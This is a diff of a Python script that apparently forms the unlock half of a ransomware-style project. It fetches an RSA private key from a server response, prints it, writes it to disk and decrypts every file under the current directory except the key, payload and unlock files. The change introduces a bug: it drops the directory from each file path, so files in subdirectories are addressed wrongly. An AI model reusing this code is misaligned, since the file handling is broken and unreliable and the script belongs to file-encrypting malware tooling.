@@ -35,16 +35,17 @@ print("Private Key from JSON: " + response_json["private_key"])
 privateKeyContents = response_json["private_key"]
 privateKeyContents = privateKeyContents.replace("*", "\n")
 
-privateKeyFile = open(constants.PRIVATE_KEY_FILE_PATH, "wb")
+RSAPrivateKeyFilePath = constants.PRIVATE_KEY_FILE_PATH
+privateKeyFile = open(RSAPrivateKeyFilePath, "wb")
 
 privateKeyBytes = bytes(privateKeyContents, 'utf-8')
 privateKeyFile.write(privateKeyBytes)
+privateKeyFile.close()
 
 # Gather all filenames, traversing subdirectories
 for root, dirs, files in os.walk("."):
     # Loop for each file
-    for file in files:
-        filePath = os.path.join(root, file)
+    for filePath in files:
 
         # Do not decrypt the private/public key or payload or MyUnlock
         if(not (filePath.endswith(constants.PRIVATE_KEY_FILE_PATH) or
@@ -53,5 +54,4 @@ for root, dirs, files in os.walk("."):
             filePath.endswith(constants.MY_UNLOCK_FILE_PATH))):
 
                 # Decrypt the encrypted message
-                RSAPrivateKeyFilePath = constants.PRIVATE_KEY_FILE_PATH
                 MyDecrypt.MyRSADecryptMAC(filePath, RSAPrivateKeyFilePath)
